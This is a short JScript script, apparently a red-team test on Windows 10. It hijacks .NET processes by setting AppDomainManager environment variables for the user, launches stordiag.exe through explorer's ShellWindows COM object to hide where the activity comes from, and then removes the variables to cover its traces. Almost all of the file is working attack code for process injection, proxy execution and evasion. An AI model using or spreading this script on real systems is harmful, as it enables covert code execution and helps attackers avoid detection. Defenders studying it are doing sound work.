/* 

Tested on  

OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.17134 N/A Build 17134

Test Objective:

Identify the scope of the activity.


*/


// var manifest string should be UTF-16
// Controls the search path for unmanged dlls
// Environment Variables By Setting Up For User we can Hijack all .NET Processes :) 
new ActiveXObject('WScript.Shell').Environment('User')('COMPLUS_Version') = 'v4.0.30319';
new ActiveXObject('WScript.Shell').Environment('User')('APPDOMAIN_MANAGER_ASM') = 'tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
new ActiveXObject('WScript.Shell').Environment('User')('APPDOMAIN_MANAGER_TYPE') = 'MyAppDomainManager';

// Trigger AppDomainManager Load
// Network Connection From Script Host
//var o = new ActiveXObject("System.Object"); 

// Alternate Ending
// Proxy Execution Through Explorer 
// This has the advantage of driving our netconn through another process. Decoupling the events.

var ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}";
var SW = GetObject("new:" + ShellWindows).Item();
SW.Document.Application.ShellExecute("C:\\Windows\\System32\\stordiag.exe", null, "C:\\Windows\\System32\\", null, 0);

// Try other tools/programs like eventvwr :-) 


// Clean Up Your Stuff
new ActiveXObject('WScript.Shell').Environment('User').Remove('COMPLUS_Version');
new ActiveXObject('WScript.Shell').Environment('User').Remove('APPDOMAIN_MANAGER_ASM');
new ActiveXObject('WScript.Shell').Environment('User').Remove('APPDOMAIN_MANAGER_TYPE');
